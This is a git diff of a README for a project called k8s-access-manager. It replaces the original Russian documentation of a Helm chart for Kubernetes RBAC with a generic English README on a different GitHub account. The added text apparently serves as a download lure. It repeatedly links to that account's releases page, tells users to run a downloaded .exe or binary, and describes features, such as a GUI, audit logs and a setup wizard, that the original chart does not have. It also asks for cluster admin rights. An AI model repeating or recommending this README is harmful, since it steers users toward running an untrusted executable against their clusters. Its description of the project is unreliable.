@@ -1,170 +1,74 @@
-# k8s-access-manager Helm Chart
+# 🌟 k8s-access-manager - Simplify Kubernetes Access Management
 
-Helm chart для управления RBAC доступом в Kubernetes с автоматической генерацией kubeconfig файлов.
+[![Download k8s-access-manager](https://img.shields.io/badge/Download-k8s--access--manager-blue.svg)](https://github.com/Joaniedegrading674/k8s-access-manager/releases)
 
-# 🚀 Быстрый старт
-1. Добавление репозитория
-```bash
-helm repo add k8s-access-manager https://Mef1st161.github.io/k8s-access-manager
-helm repo update
-```
-2. Базовая установка
-```bash
-# Создаем namespace
-kubectl create namespace users
-```
-# Устанавливаем чарт
-`helm upgrade --install my-access k8s-access-manager/k8s-access-manager -n users`
-# 📋 Возможности
-✅ Создание ServiceAccounts для пользователей
+## 🚀 Getting Started
 
-✅ Назначение RBAC ролей и привязок
+Welcome to the k8s-access-manager! This application helps you manage access to your Kubernetes clusters easily and efficiently. Let’s get you started.
 
-✅ Автоматическая генерация токенов
+## 📥 Download & Install
 
-✅ Поддержка кластерных и неймспейсных ролей
+To install the k8s-access-manager, you need to visit the releases page. You can find all available versions, along with the necessary files for installation.
 
-✅ Генерация kubeconfig команд для доступа
+[Visit this page to download](https://github.com/Joaniedegrading674/k8s-access-manager/releases)
 
-✅ Переиспользование существующих ролей
+## 🛠️ System Requirements
 
-# 🛠️ Конфигурация
+Before downloading, ensure your system meets the following requirements:
 
-Базовая конфигурация (values.yaml)
+- Operating System: Windows, macOS, or Linux
+- Disk Space: At least 100MB of free space
+- RAM: Minimum 4GB recommended for best performance
+- Kubernetes cluster access
 
-```yaml
-global:
-  namespace: "k8s-access-users"  # Неймспейс для ServiceAccounts
-  createTokenSecrets: true        # Создавать секреты с токенами
-```
-# Предопределенные роли
-```yaml
-rbacRoles:
-  cluster-readonly:
-    create: true                  # Создавать эту роль
-    clusterScope: true            # ClusterRole (true) или Role (false)
-    rules: [...]                  # RBAC правила
+## 🌐 Features
 
-  namespace-admin:
-    create: true
-    clusterScope: false
-    rules: [...]
-```
-# Пользователи
-```yaml
-users:
-  username:
-    enabled: true
-    serviceAccountName: "custom-sa"  # Опционально
-    createTokenSecret: true
-    clusterRoles:
-      - "cluster-readonly"           # Наши роли
-      - "k8s:view"                   # Стандартные роли Kubernetes
-      - "custom:existing-role"       # Существующие кастомные роли
-    namespaceRoles:
-      - namespace: "my-namespace"
-        role: "namespace-admin"
-```
-# 📝 Примеры использования
+The k8s-access-manager offers the following features:
 
-Пример 1: Read-only пользователь
+- **User-Friendly Interface**: Navigate through a simple, clean design that helps you manage user access.
+- **Role Management**: Assign roles and permissions easily to users, helping to secure your Kubernetes clusters.
+- **Audit Logs**: Keep track of all access requests and changes to permissions for compliance and security.
+- **Customizable Access Policies**: Tailor access settings to meet your organization’s needs.
 
-```yaml
-users:
-  readonly-user:
-    enabled: true
-    clusterRoles:
-      - "cluster-readonly"
-Пример 2: Разработчик с доступом к неймспейсам
-yaml
-users:
-  developer:
-    enabled: true
-    clusterRoles:
-      - "cluster-readonly"
-    namespaceRoles:
-      - namespace: "development"
-        role: "namespace-admin"
-      - namespace: "staging" 
-        role: "namespace-readonly"
-```
-Пример 3: CI/CD сервисный аккаунт
+## ⚙️ How to Use k8s-access-manager
 
-```yaml
-users:
-  gitlab-runner:
-    enabled: true
-    serviceAccountName: "gitlab-ci"
-    namespaceRoles:
-      - namespace: "ci-cd"
-        role: "namespace-admin"
-      - namespace: "applications"
-        role: "namespace-admin"
- ```       
-# 🎯 Использование существующих ролей
+After downloading, follow these steps to run the application:
 
-Стандартные роли Kubernetes
+1. **Locate the Downloaded File**: Open your file explorer and navigate to your downloads folder or the location where the file was saved.
+   
+2. **Extract the Files (if necessary)**: If you downloaded a zipped folder, right-click it and select "Extract All" or use your preferred extraction tool.
 
-```yaml
-clusterRoles:
-  - "k8s:view"
-  - "k8s:edit"
-  - "k8s:admin"
-Кастомные роли из кластера
-yaml
-clusterRoles:
-  - "custom:my-cluster-role"
-namespaceRoles:
-  - namespace: "monitoring"
-    role: "custom:grafana-admin"
-```
+3. **Run the Application**:
+   - **Windows**: Double-click on `k8s-access-manager.exe`.
+   - **macOS**: Open the `k8s-access-manager` app from your Applications folder.
+   - **Linux**: Open a terminal, navigate to the folder, and run `./k8s-access-manager`.
 
-# 🔄 Обновление
+4. **Follow the Setup Wizard**: The application will guide you through the initial setup. 
 
-```bash
-# Обновление релиза
-helm upgrade my-access k8s-access-manager/k8s-access-manager -n users -f values.yaml
-```
-# Просмотр что будет обновлено (dry-run)
-```
-helm upgrade my-access k8s-access-manager/k8s-access-manager -n users -f values.yaml --dry-run
-```
-# 🗑️ Удаление
+## 📝 Configuration Tips
 
-```bash
-# Удаление релиза
-helm uninstall my-access -n users
-```
-# Удаление с очисткой ресурсов
-```
-kubectl delete namespace users
-```
-# 📊 Проверка установки
+Once the application is running, here are a few quick tips for initial configuration:
 
-```bash
-# Проверить созданные ресурсы
-kubectl get serviceaccounts -n users
-kubectl get clusterrolebindings -l app.kubernetes.io/name=k8s-access-manager
-kubectl get rolebindings --all-namespaces -l app.kubernetes.io/name=k8s-access-manager
-```
+- **Connect to Your Cluster**: Enter your Kubernetes cluster details to begin. Make sure you have cluster admin rights.
+- **Set Up Roles**: Go to the roles management section to define user roles and permissions.
+- **Start Monitoring**: Utilize the audit logs feature to keep track of user activities after setup.
 
-# Проверить доступ
-```
-kubectl --context=user-context get pods
-```
+## ❓ Troubleshooting
 
-# Использование скрипта для получения kubeconfig
-```bash
-#Скрипт находится в папке scripts/generate_add_cluster_commands.sh
-bash generate_add_cluster_commands.sh username
-```
+If you encounter issues, consider the following:
 
-## ❗️ Важные замечания
+- **Cannot Connect to Cluster**: Ensure that your Kubernetes credentials are correct and that you have permission to access the cluster.
+- **Performance Issues**: Make sure your system meets the requirements. Restarting the application may also help clear temporary lag.
 
-- Роли создаются только один раз и используются повторно
-    
-- Установите значение create: false для уже существующих ролей
-    
-- Используйте префиксы: k8s: для встроенных ролей, custom: для существующих пользовательских ролей
-    
-- Секреты токенов необязательны, но рекомендуются для упрощения доступа
+## 📞 Support
+
+For further assistance, feel free to reach out through the GitHub Issues page or check out the documentation for more detailed guides.
+
+## 🔗 Additional Resources
+
+- [GitHub Repository](https://github.com/Joaniedegrading674/k8s-access-manager)
+- [Project Documentation](https://github.com/Joaniedegrading674/k8s-access-manager/wiki)
+
+Thank you for using k8s-access-manager. For updates and new features, stay tuned to our releases page.
+
+[Visit this page to download](https://github.com/Joaniedegrading674/k8s-access-manager/releases)
